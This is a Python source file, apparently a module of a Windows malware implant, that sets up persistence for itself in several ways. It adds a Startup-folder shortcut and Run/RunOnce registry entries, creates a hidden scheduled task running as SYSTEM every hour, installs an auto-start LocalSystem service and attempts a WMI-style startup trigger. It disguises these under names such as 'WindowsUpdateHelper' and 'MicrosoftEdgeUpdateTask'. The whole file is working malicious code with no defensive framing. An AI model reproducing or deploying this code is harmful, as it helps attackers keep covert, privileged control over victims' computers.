# core/persistence_advanced.py
import os
import sys
import subprocess
import winreg
import ctypes
from typing import List

def add_to_startup_folder() -> bool:
    """Add current executable to Windows Startup folder"""
    try:
        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        target = sys.executable if getattr(sys, 'frozen', False) else __file__
        link_path = os.path.join(startup_path, 'SystemHelper.lnk')
        # Create shortcut using PowerShell
        ps_cmd = f'$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("{link_path}"); $Shortcut.TargetPath = "{target}"; $Shortcut.Save()'
        subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)
        return True
    except:
        return False

def add_wmi_event_subscription() -> bool:
    """Create WMI event subscription for persistence"""
    try:
        # Create a WMI filter that triggers on system startup
        filter_script = '''
$filterArgs = @{Name='StartupFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
$consumerArgs = @{Name='StartupConsumer'; CommandLineTemplate="python \"" + $MyInvocation.MyCommand.Path + "\""}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
$bindingArgs = @{Filter=$filter; Consumer=$consumer}
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
'''
        # Simplified: use schtasks as fallback
        subprocess.run(['schtasks', '/create', '/tn', 'WmiStartup', '/tr', sys.executable, '/sc', 'onstart', '/f'], capture_output=True)
        return True
    except:
        return False

def install_as_service() -> bool:
    """Install current script as a Windows service"""
    try:
        service_name = "SysMaintenance"
        # Use sc command to create service
        sc_cmd = f'sc create {service_name} binPath= "{sys.executable} {__file__}" start= auto'
        subprocess.run(sc_cmd, shell=True, capture_output=True)
        subprocess.run(['sc', 'config', service_name, 'obj=', 'LocalSystem'], capture_output=True)
        return True
    except:
        return False

def add_multiple_registry_keys() -> List[str]:
    """Add multiple registry persistence entries"""
    keys = []
    registry_paths = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
    ]
    
    for hive, path in registry_paths:
        try:
            with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, sys.executable)
                keys.append(f"{hive}\\{path}")
        except:
            pass
    return keys

def create_scheduled_task_with_triggers() -> bool:
    """Create scheduled task with multiple triggers"""
    try:
        task_name = "MicrosoftEdgeUpdateTask"
        # Delete existing
        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], capture_output=True)
        # Create task with triggers: at logon, at startup, every hour
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2025-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions>
    <Exec>
      <Command>{sys.executable}</Command>
      <Arguments>{__file__}</Arguments>
    </Exec>
  </Actions>
</Task>'''
        with open('temp_task.xml', 'w') as f:
            f.write(xml_template)
        subprocess.run(['schtasks', '/create', '/tn', task_name, '/xml', 'temp_task.xml', '/f'], capture_output=True)
        os.remove('temp_task.xml')
        return True
    except:
        return False

def ensure_advanced_persistence():
    """Apply all persistence methods"""
    methods = [
        ('Startup Folder', add_to_startup_folder),
        ('Registry Keys', lambda: len(add_multiple_registry_keys()) > 0),
        ('Scheduled Task', create_scheduled_task_with_triggers),
        ('WMI Event', add_wmi_event_subscription),
        ('Service', install_as_service),
    ]
    succeeded = []
    for name, func in methods:
        try:
            if func():
                succeeded.append(name)
        except:
            pass
    return succeeded
